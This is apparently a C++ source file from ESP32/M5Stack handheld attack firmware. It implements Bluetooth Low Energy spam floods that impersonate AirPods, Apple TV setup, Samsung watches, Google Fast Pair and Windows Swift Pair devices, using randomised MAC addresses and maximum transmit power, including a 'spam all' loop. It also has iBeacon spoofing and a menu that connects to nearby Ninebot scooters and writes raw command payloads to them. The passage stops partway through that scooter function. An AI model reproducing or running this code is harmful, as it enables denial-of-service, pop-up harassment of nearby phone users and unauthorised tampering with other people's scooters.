

#include "ble_menu.h"
#include "ble_jammer.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>
#include <NimBLEScan.h>
#include <NimBLEAdvertisedDevice.h>
#include <esp_mac.h>
#include <esp_bt.h>
#include <esp_wifi.h>

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || \
      defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

static inline void bleAddData(NimBLEAdvertisementData &adv, const uint8_t *data, size_t len)
{
    adv.addData(std::string(reinterpret_cast<const char *>(data), len));
}

enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };

struct WatchModel { uint8_t value; };

static const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
};
static const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};

struct DeviceType { uint32_t value; };

static const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
};
static const int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

static const WatchModel watch_models[26] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
    {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
    {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};

static char randomNameBuffer[32];

static const char *generateRandomName()
{
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 10 + 1;
    if (len > 31) len = 31;
    for (int i = 0; i < len; ++i) {
        randomNameBuffer[i] = charset[rand() % strlen(charset)];
    }
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

static void generateRandomMac(uint8_t *mac)
{
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
                                       0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_max[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa,
                                           0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_gen3[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa,
                                            0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_airpods_pro_gen2[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
                                                0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_solo_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa,
                                              0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_studio_buds[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
                                                 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_fit_pro[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa,
                                             0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_beats_studio_buds_plus[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
                                                      0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_phone[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_transfer_number[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                               0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c,
                                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_tv_color_balance[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c,
                                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_vision_pro[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                          0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_connecting[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_apple_tv_audio_sync[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                   0x00, 0x0f, 0x05, 0xc1, 0x19, 0x60, 0x4c,
                                                   0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                  0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                                  0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_homepod_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x0B, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_homekit_apple_tv_setup[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                                      0x00, 0x0f, 0x05, 0xc1, 0x0D, 0x60, 0x4c,
                                                      0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_pair_apple_tv[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                                             0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t data_setup_new_ipad[] = {0x4C, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00,
                                              0x00, 0x0f, 0x05, 0x40, 0x09, 0x60, 0x4c,
                                              0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

struct ApplePayload {
    const char *name;
    const uint8_t *data;
    uint8_t length;
};

static const ApplePayload apple_payloads[] = {
    {"AirPods",            data_airpods,                sizeof(data_airpods)               },
    {"AirPods Pro",        data_airpods_pro,            sizeof(data_airpods_pro)           },
    {"AirPods Max",        data_airpods_max,            sizeof(data_airpods_max)           },
    {"AirPods Gen 2",      data_airpods_gen2,           sizeof(data_airpods_gen2)          },
    {"AirPods Gen 3",      data_airpods_gen3,           sizeof(data_airpods_gen3)          },
    {"AirPods Pro Gen 2",  data_airpods_pro_gen2,       sizeof(data_airpods_pro_gen2)      },
    {"Beats Solo Pro",     data_beats_solo_pro,         sizeof(data_beats_solo_pro)        },
    {"Beats Studio Buds",  data_beats_studio_buds,      sizeof(data_beats_studio_buds)     },
    {"Beats Fit Pro",      data_beats_fit_pro,          sizeof(data_beats_fit_pro)         },
    {"Beats Studio Buds+", data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
    {"AppleTV Setup",      data_apple_tv_setup,         sizeof(data_apple_tv_setup)        },
    {"Setup New Phone",    data_setup_new_phone,        sizeof(data_setup_new_phone)       },
    {"Transfer Number",    data_transfer_number,        sizeof(data_transfer_number)       },
    {"TV Color Balance",   data_tv_color_balance,       sizeof(data_tv_color_balance)      },
    {"Apple Vision Pro",   data_vision_pro,             sizeof(data_vision_pro)            },
    {"AppleTV Connecting", data_apple_tv_connecting,    sizeof(data_apple_tv_connecting)   },
    {"AppleTV Audio Sync", data_apple_tv_audio_sync,    sizeof(data_apple_tv_audio_sync)   },
    {"Setup New AppleTV",  data_setup_new_apple_tv,     sizeof(data_setup_new_apple_tv)    },
    {"HomePod Setup",      data_homepod_setup,          sizeof(data_homepod_setup)         },
    {"HomeKit AppleTV",    data_homekit_apple_tv_setup, sizeof(data_homekit_apple_tv_setup)},
    {"Pair AppleTV",       data_pair_apple_tv,          sizeof(data_pair_apple_tv)         },
    {"Setup New iPad",     data_setup_new_ipad,         sizeof(data_setup_new_ipad)        }
};
static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);

static BLEAdvertising *pBLEAdv = nullptr;

static BLEAdvertisementData getUniversalAdvertisementData(EBLEPayloadType Type, const String &customName = "")
{
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
        case Microsoft: {
            const char *Name;
            uint8_t name_len;
            if (customName.length() > 0) {
                Name = customName.c_str();
                name_len = customName.length();
            } else {
                Name = generateRandomName();
                name_len = strlen(Name);
            }
            AdvData_Raw = new uint8_t[7 + name_len];
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
            bleAddData(AdvData, AdvData_Raw, 7 + name_len);
            delete[] AdvData_Raw;
            break;
        }
        case AppleJuice: {
            int rand_val = random(2);
            if (rand_val == 0) {
                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00};
                bleAddData(AdvData, packet, 26);
            } else if (rand_val == 1) {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                bleAddData(AdvData, packet, 23);
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            uint8_t j = 0;
            packet[j++] = 16;
            packet[j++] = 0xFF;
            packet[j++] = 0x4C;
            packet[j++] = 0x00;
            packet[j++] = 0x0F;
            packet[j++] = 0x05;
            packet[j++] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[j++] = types[random() % sizeof(types)];
            esp_fill_random(&packet[j], 3);
            j += 3;
            packet[j++] = 0x00;
            packet[j++] = 0x00;
            packet[j++] = 0x10;
            esp_fill_random(&packet[j], 3);
            bleAddData(AdvData, packet, 17);
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(26)].value;
            uint8_t Samsung_Data[15] = {
                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
                0xFF, 0x00, 0x00, 0x43, (uint8_t)((model >> 0x00) & 0xFF)
            };
            bleAddData(AdvData, Samsung_Data, 15);
            break;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A,
                (uint8_t)((rand() % 120) - 100)
            };
            bleAddData(AdvData, Google_Data, 14);
            break;
        }
        default: break;
    }
    return AdvData;
}

static void executeSpam(EBLEPayloadType type, const String &customName = "")
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    NimBLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pBLEAdv = NimBLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = getUniversalAdvertisementData(type, customName);
    BLEAdvertisementData oScanResponseData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);

    pBLEAdv->setAdvertisementData(advertisementData);
    pBLEAdv->setScanResponseData(oScanResponseData);
    pBLEAdv->setMinInterval(32);
    pBLEAdv->setMaxInterval(48);
    pBLEAdv->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);

    pBLEAdv->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
    NimBLEDevice::deinit(true);
}

static void executeCustomSpam(const String &spamName)
{
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) macAddr[i] = esp_random() & 0xFF;
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
    esp_base_mac_addr_set(macAddr);

    NimBLEDevice::init("sh4rk");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pBLEAdv = NimBLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);
    advertisementData.setName(spamName.c_str());
    pBLEAdv->addServiceUUID(NimBLEUUID("1812"));
    pBLEAdv->setAdvertisementData(advertisementData);
    pBLEAdv->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pBLEAdv->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
    NimBLEDevice::deinit(true);
}

static void quickAppleSpam(int payloadIndex)
{
    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    NimBLEDevice::init("");
    BLEAdvertising *pAdv = NimBLEDevice::getAdvertising();

    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);

    uint8_t fullPayload[31];
    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
    fullPayload[1] = 0xFF;
    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);

    bleAddData(advertisementData, fullPayload, apple_payloads[payloadIndex].length + 2);

    pAdv->setAdvertisementData(advertisementData);
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    pAdv->setScanResponseData(scanResponseData);
    pAdv->setMinInterval(32);
    pAdv->setMaxInterval(48);
    pAdv->start();
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdv->stop();
    vTaskDelay(5 / portTICK_PERIOD_MS);
    NimBLEDevice::deinit(true);
}

static void aj_adv(int ble_choice)
{
    int count = 0;
    String spamName = "";
    if (ble_choice == 6) {
        spamName = keyboard("", 24, "Name to spam");
        if (spamName == "\x1B") return;
    }
    if (ble_choice == 2) {
        spamName = keyboard("", 24, "Windows Name to spam");
        if (spamName == "\x1B") return;
    }

    if (ble_choice == 5) {
        drawMainBorder(true);
        M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
        M5.Display.setTextSize(FP);
        M5.Display.setTextDatum(top_left);
        M5.Display.drawString("SPAM ALL", 4, 28);

        logClear();
        logPrint("Cycling all protocols");
        logPrint("Back: stop");
        logRender();

        for (;;) {
            if (check(EscPress)) { waitAllKeysReleased(); break; }
            int protocol = count % 7;
            String line;
            switch (protocol) {
                case 0: line = "Android "  + String(count); logPrint(line); logRender(); executeSpam(Google);    break;
                case 1: line = "Samsung " + String(count); logPrint(line); logRender(); executeSpam(Samsung);   break;
                case 2: line = "Windows " + String(count); logPrint(line); logRender(); executeSpam(Microsoft); break;
                case 3: line = "AppleTV " + String(count); logPrint(line); logRender(); quickAppleSpam(10);      break;
                case 4: line = "AirPods " + String(count); logPrint(line); logRender(); quickAppleSpam(0);       break;
                case 5: line = "SourApple " + String(count); logPrint(line); logRender(); executeSpam(SourApple); break;
                case 6: line = "AppleJuice " + String(count); logPrint(line); logRender(); executeSpam(AppleJuice); break;
            }
            count++;
            M5.update();
            pollKeyboard();
        }
        NimBLEDevice::init("");
        vTaskDelay(100 / portTICK_PERIOD_MS);
        pBLEAdv = nullptr;
        NimBLEDevice::deinit(true);
        return;
    }

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("BLE SPAM", 4, 28);
    logClear();
    logPrint("Back: stop");
    logRender();

    for (;;) {
        String line;
        switch (ble_choice) {
            case 0: line = "AppleTV " + String(count);    logPrint(line); logRender(); quickAppleSpam(10); break;
            case 1: line = "AirPods " + String(count);    logPrint(line); logRender(); quickAppleSpam(0);  break;
            case 2: line = "SwiftPair (" + String(count) + ")"; logPrint(line); logRender(); executeSpam(Microsoft, spamName); break;
            case 3: line = "Samsung ("  + String(count) + ")"; logPrint(line); logRender(); executeSpam(Samsung);  break;
            case 4: line = "Android ("  + String(count) + ")"; logPrint(line); logRender(); executeSpam(Google);   break;
            case 6: line = "Spamming " + spamName + "(" + String(count) + ")"; logPrint(line); logRender(); executeCustomSpam(spamName); break;
            case 7: line = "SourApple " + String(count); logPrint(line); logRender(); executeSpam(SourApple);  break;
            case 8: line = "AppleJuice " + String(count); logPrint(line); logRender(); executeSpam(AppleJuice); break;
        }
        count++;
        M5.update();
        pollKeyboard();
        if (check(EscPress)) { waitAllKeysReleased(); break; }
    }
    NimBLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pBLEAdv = nullptr;
    NimBLEDevice::deinit(true);
}

void bleIbeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    NimBLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(ManufacturerId);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(NimBLEUUID(BEACON_UUID));

    pBLEAdv = NimBLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pBLEAdv->setAdvertisementData(advertisementData);

    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.drawString("iBEACON", 4, 28);
    logClear();
    logPrint("Name: " + String(DeviceName));
    logPrint("UUID: " + String(BEACON_UUID));
    logPrint("Mfg:  0x" + String(ManufacturerId, HEX));
    logPrint("");
    logPrint("Advertising...");
    logPrint("Back: stop");
    logRender();

    for (;;) {
        pBLEAdv->start();
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pBLEAdv->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
        M5.update();
        pollKeyboard();
        if (check(EscPress)) { waitAllKeysReleased(); break; }
    }
    NimBLEDevice::deinit(true);
}

static bool bleScanRunning = false;

class KitenAdvertisedCallbacks : public NimBLEAdvertisedDeviceCallbacks {
public:
    std::vector<Option> *optsPtr;
    KitenAdvertisedCallbacks(std::vector<Option> *p) : optsPtr(p) {}

    void onResult(NimBLEAdvertisedDevice *advertisedDevice) override {
        String bt_name = advertisedDevice->getName().c_str();
        String bt_title = bt_name;
        String bt_address = advertisedDevice->getAddress().toString().c_str();
        String bt_signal = String(advertisedDevice->getRSSI());
        if (bt_title.isEmpty()) bt_title = bt_address;
        if (bt_name.isEmpty()) bt_name = "<no name>";
        if (optsPtr->size() < 60) {
            optsPtr->push_back({bt_title + " (" + bt_signal + "dBm)", [bt_name, bt_address, bt_signal]() {
                drawMainBorder(true);
                M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
                M5.Display.setTextSize(FP);
                M5.Display.setTextDatum(top_left);
                M5.Display.drawString("BLE INFO", 4, 28);
                logClear();
                logPrint("Name:    " + bt_name);
                logPrint("Address: " + bt_address);
                logPrint("Signal:  " + bt_signal + " dBm");
                logPrint("");
                logPrint("Sel: rescan");
                logPrint("Back: return");
                logRender();
                waitAllKeysReleased();
                for (;;) {
                    M5.update();
                    pollKeyboard();
                    if (check(EscPress) || check(SelPress)) {
                        waitAllKeysReleased();
                        break;
                    }
                    delay(5);
                }
            }});
        }
    }
};

void bleScan()
{
    std::vector<Option> scanOpts;
    NimBLEDevice::init("");
    NimBLEScan *pScan = NimBLEDevice::getScan();
    KitenAdvertisedCallbacks cb(&scanOpts);
    pScan->setAdvertisedDeviceCallbacks(&cb);
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);

    displayInfo("Scanning BLE...", false);

    NimBLEScanResults results = pScan->start(5, false);
    pScan->stop();
    pScan->clearResults();

    NimBLEDevice::deinit(true);

    if (scanOpts.empty()) {
        displayInfo("No BLE devices found", true);
        return;
    }
    scanOpts.push_back({"Back", [](){}});
    loopOptions(scanOpts, MENU_TYPE_REGULAR, "BLE Devices");
}

static const NimBLEUUID ninebot_uart_service("6E400001-B5A3-F393-E0A9-E50E24DCCA9E");
static const NimBLEUUID ninebot_tx_char("6E400002-B5A3-F393-E0A9-E50E24DCCA9E");

static const uint8_t ninebot_max2g[] = {
    0x55, 0xAB, 0x4D, 0x41, 0x58, 0x32, 0x53, 0x63, 0x6F, 0x6F, 0x74, 0x65, 0x72, 0x5F, 0x31
};
static const uint8_t ninebot_f2[] = {
    0x55, 0xAB, 0x46, 0x32, 0x53, 0x63, 0x6F, 0x6F, 0x74, 0x65, 0x72, 0x5F, 0x31
};
static const uint8_t ninebot_gen1[] = {
    0x5A, 0xA5, 0x00, 0x4B, 0x48, 0x94, 0xE3, 0x3A, 0x91, 0xE0, 0x32, 0x7E, 0xC2
};
static const uint8_t ninebot_gen2[] = {
    0x5A, 0xA5, 0x00, 0x4B, 0x48, 0x94, 0xE3, 0x3A, 0x91, 0xE0, 0x43, 0x3E, 0xC2
};
static const uint8_t ninebot_gen3[] = {
    0x5A, 0xA5, 0x00, 0x4B, 0x48, 0x94, 0xE3, 0x3A, 0x91, 0xE0, 0x42, 0x7E, 0xC4
};
struct NinebotPayload { const char *label; const uint8_t *data; size_t len; };
static const NinebotPayload ninebot_payloads[] = {
    {"Ninebot Max 2G / G30", ninebot_max2g, sizeof(ninebot_max2g)},
    {"Ninebot F2",            ninebot_f2,    sizeof(ninebot_f2)   },
    {"Ninebot Generic 1",     ninebot_gen1,  sizeof(ninebot_gen1) },
    {"Ninebot Generic 2",     ninebot_gen2,  sizeof(ninebot_gen2) },
    {"Ninebot Generic 3",     ninebot_gen3,  sizeof(ninebot_gen3) },
};

void ninebotMenu()
{
    NimBLEDevice::init("");
    NimBLEScan *pScan = NimBLEDevice::getScan();
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);

    NimBLEClient *pClient = NimBLEDevice::createClient();
    pClient->setConnectTimeout(3);

    for (;;) {
        drawMainBorder(true);
        M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
        M5.Display.setTextSize(FP);
        M5.Display.setTextDatum(top_left);
        M5.Display.drawString("NINEBOT", 4, 28);
        logClear();
        logPrint("Scanning...");
        logRender();

        NimBLEScanResults results = pScan->start(5, false);
        if (check(EscPress)) { waitAllKeysReleased(); break; }

        if (results.getCount() == 0) {
            displayInfo("No devices found", false);
            delay(1000);
            pScan->clearResults();
            continue;
        }

        std::vector<Option> devOpts;
        for (int i = 0; i < results.getCount(); i++) {
            NimBLEAdvertisedDevice dev = results.getDevice(i);
            String name = dev.getName().length() ? String(dev.getName().c_str())
                                                 : String(dev.getAddress().toString().c_str());
            NimBLEAddress addr = dev.getAddress();
            devOpts.push_back({name, [pClient, addr]() {
                drawMainBorder(true);
                M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
                M5.Display.setTextSize(FP);
                M5.Display.setTextDatum(top_left);
                M5.Display.drawString("NINEBOT", 4, 28);
                logClear();
                logPrint("Connecting...");
                logRender();

                if (!pClient->connect(addr)) {
                    displayError("Connection failed", true);
                    return;
                }
                if (!pClient->discoverAttributes()) {
                    displayError("Discover failed", true);
                    pClient->disconnect();
                    return;
                }
                NimBLERemoteService *svc = pClient->getService(ninebot_uart_service);
                if (!svc) {
                    displayError("Not a scooter", true);
                    pClient->disconnect();
                    return;
                }
                NimBLERemoteCharacteristic *ch = svc->getCharacteristic(ninebot_tx_char);
                if (!ch || !(ch->canWrite() || ch->canWriteNoResponse())) {
                    displayError("TX not writable", true);
                    pClient->disconnect();
                    return;
                }
                
                std::vector<Option> payloadOpts;
                for (size_t i = 0; i < sizeof(ninebot_payloads)/sizeof(ninebot_payloads[0]); i++) {
                    NinebotPayload pd = ninebot_payloads[i];
                    payloadOpts.push_back({pd.label, [ch, pd]() {
                        bool ok = ch->writeValue(pd.data, pd.len, true);
                        if (ok) displaySuccess("Write OK!", true);
                        else    displayError("Write failed", true);
                    }});
                }
                payloadOpts.push_back({"Back", [pClient]() { pClient->disconnect(); }});
                loopOptions(payloadOpts, MENU_TYPE_REGULAR, "Pick Payload");
                pClient->disconnect();
            }});
        }
        devOpts.push_back({"Scan again", [](){}});
        devOpts.push_back({"Back", [](){}});
        int s = loopOptions(devOpts, MENU_TYPE_REGULAR, "Pick Scooter");
        pScan->clearResults();
        if (s == -1 || s == (int)devOpts.size() - 1) break;
    }

    pScan->stop();
    pScan->clearResults();
